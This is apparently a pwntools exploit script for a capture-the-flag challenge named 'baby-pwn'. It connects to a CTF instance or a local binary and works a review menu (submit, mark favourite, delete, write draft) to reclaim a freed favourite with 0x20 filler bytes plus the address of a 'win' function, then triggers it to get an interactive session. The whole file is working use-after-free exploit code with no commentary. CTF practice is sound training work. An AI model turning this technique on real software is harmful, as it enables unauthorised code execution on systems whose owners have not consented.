#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "baby-pwn-ed3e29bf538c.inst14.ctf.fortid.com"
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401658
            b* 0x00000000004016C3
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): 
    p.sendlineafter(pr, dt)

def sa(pr, dt): 
    p.sendafter(pr, dt)

def menu(opt):
    sla(b'> ', str(opt).encode())

def submit_review(text):
    menu(1)
    sa(b'Review: ', text)

def mark_favourite():
    menu(2)

def delete_review():
    menu(3)

def write_draft(data):
    menu(4)
    sla(b'): ', str(len(data)).encode())
    sa(b'draft bytes: ', data)

def preview_favourite():
    menu(5)

def leave():
    menu(6)

# GDB()
submit_review(b'd1nhdwc\n')
mark_favourite()
delete_review()

pl = flat(
    b'A'*0x20,
    elf.sym.win
)

write_draft(pl)

preview_favourite()


p.interactive()